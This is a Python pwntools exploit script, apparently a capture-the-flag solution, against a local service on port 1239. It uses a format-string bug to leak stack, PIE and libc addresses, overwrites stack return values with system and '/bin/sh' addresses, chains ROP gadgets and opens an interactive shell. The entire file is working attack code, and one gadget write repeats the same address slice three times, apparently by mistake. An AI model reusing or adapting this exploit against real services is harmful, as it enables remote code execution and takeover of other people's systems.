from pwn import *
import time

#p=process("./real")
p=remote("localhost",1239)

raw_input("wait!")

print p.recvuntil("0x")
stack_p=int(p.recv(12),16)
print p.recv()

print 'stack pointer -> ',hex(stack_p)
p.sendline("%d" %(stack_p-7))

#pie leak
print p.recvuntil("value is ")
pie=(int(p.recv(2),16)-0xc)*0x100
print p.recv()

main=pie+0xb98
non_sub_main=pie+0xb9c
print_ret=stack_p-0x8
print 'main addr -> ',hex(main),'\nprint_ret addr -> ',hex(print_ret)

#return to main!!!!
payload="%"+str(main)+"c%1$hn\n"+str(print_ret)
p.sendline(payload)
print p.recv()
for i in range(0,14):
    p.sendline("%p"*50+"\n"+str(print_ret))
    print p.recv()
print p.recv()

# I'll see!!!!!  
p.sendline(str(print_ret))
pppr=pie+0xea0
dup2=pie+0xd8c
payload="fuck%2$p"
payload+="%"+str(non_sub_main-len(payload)-0xa)+"c%1$hnABCDEFG\n"+str(stack_p-8)
p.sendline(payload)
payload="%"+str(dup2)+"c%1$hn\n"+str(stack_p-8)
p.sendline(payload)
payload="%"+str(pppr)+"c%1$hn\n"+str(stack_p-0x20)
p.sendline(payload)

for i in range(12):
    p.sendline("%p"*50+"\n"+str(print_ret))


#print p.recv()
print p.recvuntil("fuck0x")
pie_base=int(p.recv(12),16)-0x202100
printf_got=pie_base+0x201f98

p.recvuntil("See? -->")
print 'leaking start!'


def get_value(address):
    print 'address -> ',hex(address)
    p.sendline(str(address))
    p.recvuntil("value is ")
    value=int(p.recv(2),16)
    p.recv()
    #return to main!!!!
    payload="%"+str(main)+"c%1$hn\n"+str(print_ret)
    p.sendline(payload)
    p.recv()
    for i in range(14):
        p.sendline("%p"*50+"\n"+str(print_ret))
        p.recv()
    p.recv()

    # I'll see!!!!!
    p.sendline(str(stack_p))
    #pppr=pie+0xea0
    #dup2=pie+0xd8c
    payload="fuck%2$p"
    payload+="%"+str(non_sub_main-len(payload)-0xa)+"c%1$hn\n"+str(stack_p-8)
    p.sendline(payload)
    payload="%"+str(dup2)+"c%1$hn\n"+str(stack_p-8)
    p.sendline(payload)
    payload="%"+str(pppr)+"c%1$hn\n"+str(stack_p-0x20)
    p.sendline(payload)

    for i in range(12):
        p.sendline("%p"*50+"\n"+str(print_ret))

    #print p.recvuntil("fuck0x")
    #pie_base=int(p.recv(12),16)-0x202100
    #dup2_got=pie_base+0x201f90
    print p.recvuntil('See? -->')
    print 'value -> ',hex(value)
    return value

printf_libc=0
for i in range(8):
    printf_libc+=get_value(printf_got+(i))*(0x10**(2*i))

libc_base=printf_libc-0x55800
system=libc_base+0x45390
bin_sh=libc_base+0x18c177
ppr=pie_base+0xea3

print 'pie base addr -> ', hex(pie_base)
print 'dup2 got addr -> ',hex(printf_got)
print 'dup2 libc leak!!!! -> ', hex(printf_libc)
print 'libc_base addr ->' ,hex(libc_base)
print 'system addr -> ',hex(system)
print 'bin_sh addr -> ',hex(bin_sh)
print 'ppr addr -> ',hex(ppr)

p.sendline(str(stack_p))
print p.recv()

#write system
hex_str="%x" %(system)
stack_system=stack_p+0x30
payload="%"+str(int(hex_str[8:12],16))+"c%1$hn\n"+str(stack_system)
print payload, "addr -> ",hex_str[8:12]
p.sendline(payload)
p.recv()
payload="%"+str(int(hex_str[4:8],16))+"c%1$hn\n"+str(stack_system+2)
print payload, "addr -> ",hex_str[4:8]
p.sendline(payload)
p.recv()
payload="%"+str(int(hex_str[:4],16))+"c%1$hn\n"+str(stack_system+4)
print payload, "addr -> ",hex_str[:4]
p.sendline(payload)
p.recv()

#write bin_sh
hex_str="%x" %(bin_sh)
stack_binsh=stack_p+0x28
payload="%"+str(int(hex_str[8:12],16))+"c%1$hn\n"+str(stack_binsh)
print payload, "addr -> ",hex_str[8:12]
p.sendline(payload)
p.recv()
payload="%"+str(int(hex_str[4:8],16))+"c%1$hn\n"+str(stack_binsh+2)
print payload, "addr -> ",hex_str[4:8]
p.sendline(payload)
p.recv()
payload="%"+str(int(hex_str[:4],16))+"c%1$hn\n"+str(stack_binsh+4)
print payload, "addr -> ",hex_str[:4]
p.sendline(payload)
p.recv()

#write ppr
hex_str="%x" %(ppr)
stack_ppr=stack_p+0x20
payload="%"+str(int(hex_str[8:12],16))+"c%1$hn\n"+str(stack_ppr)
print payload, "addr -> ",hex_str[8:12]
p.sendline(payload)
p.recv()
payload="%"+str(int(hex_str[8:12],16))+"c%1$hn\n"+str(stack_ppr+2)
print payload, "addr -> ",hex_str[4:8]
p.sendline(payload)
p.recv()
payload="%"+str(int(hex_str[8:12],16))+"c%1$hn\n"+str(stack_ppr+4)
print payload, "addr -> ",hex_str[:4]
p.sendline(payload)
p.recv()

#triger rop
ppppr=pie+0xe9b
payload="%"+str(ppppr)+"c%1$hn\n"+str(stack_p-8)
p.sendline(payload)
p.recv()

for i in range(5):
    p.sendline("%p"*50+"\n"+str(print_ret))
    p.recv()

p.interactive()
